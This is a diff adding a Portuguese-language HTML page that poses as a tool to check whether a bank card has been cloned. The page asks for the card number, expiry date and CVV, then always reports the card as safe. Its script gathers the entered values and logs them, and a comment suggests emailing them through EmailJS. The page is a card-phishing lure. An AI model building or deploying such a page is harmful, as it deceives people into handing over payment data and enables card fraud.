@@ -1,0 +1,139 @@
+<html><head><base href="/" /><meta charset="utf-8"><title>Formulário de Contato</title><style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 20px;
+      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+  
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 500px;
+    }
+  
+    h1 {
+      color: #2c3e50;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+  
+    .form-group {
+      margin-bottom: 20px;
+    }
+  
+    label {
+      display: block;
+      margin-bottom: 8px;
+      color: #34495e;
+      font-weight: 500;
+    }
+  
+    input, textarea {
+      width: 100%;
+      padding: 10px;
+      border: 2px solid #e0e0e0;
+      border-radius: 5px;
+      font-size: 16px;
+      transition: border-color 0.3s ease;
+    }
+  
+    input:focus, textarea:focus {
+      outline: none;
+      border-color: #3498db;
+    }
+  
+    button {
+      background-color: #3498db;
+      color: white;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 16px;
+      transition: background-color 0.3s ease;
+    }
+  
+    button:hover {
+      background-color: #2980b9;
+    }
+  
+    .success-message {
+      display: none;
+      color: #27ae60;
+      text-align: center;
+      margin-top: 20px;
+    }
+  </style></head><body>
+    <div class="container">
+      <h1>VERIFIQUE SE SEU CARTAO ESTA CLONADO</h1>
+      <form id="contactForm">
+        <div class="form-group">
+          <label for="name">NUMERO:</label>
+          <input type="text" id="name" name="name" required>
+        </div>
+  
+        <div class="form-group">
+          <label for="email">DATA DO CARTAO:</label>
+          <input type="email" id="email" name="email" required>
+        </div>
+  
+        <div class="form-group">
+          <label for="phone">CVV:</label>
+          <input type="tel" id="phone" name="phone" required>
+        </div>
+  
+        <button type="submit">VERIFICAR</button>
+      </form>
+      <div id="successMessage" class="success-message">
+        SEU CARTAO ESTA SEGURO!
+      </div>
+    </div>
+  
+    <script>
+      document.getElementById('contactForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Coleta os dados do formulário
+        const formData = {
+          name: document.getElementById('name').value,
+          email: document.getElementById('email').value,
+          phone: document.getElementById('phone').value,
+          message: document.getElementById('message').value
+        };
+  
+        // Aqui você pode adicionar o código para enviar os dados para seu email
+        // Por exemplo, usando EmailJS ou outro serviço de email
+        
+        // Exemplo usando EmailJS (você precisaria incluir a biblioteca e configurar sua conta)
+        // emailjs.send("service_id", "template_id", formData)
+        //   .then(function(response) {
+        //     console.log("SUCCESS", response);
+        //   }, function(error) {
+        //     console.log("FAILED", error);
+        //   });
+  
+        // Por enquanto, apenas mostraremos os dados no console
+        console.log('Dados do formulário:', formData);
+        
+        // Mostra mensagem de sucesso
+        document.getElementById('successMessage').style.display = 'block';
+        
+        // Limpa o formulário
+        document.getElementById('contactForm').reset();
+        
+        // Esconde a mensagem de sucesso após 3 segundos
+        setTimeout(() => {
+          document.getElementById('successMessage').style.display = 'none';
+        }, 3000);
+      });
+    </script>
+  </body></html>
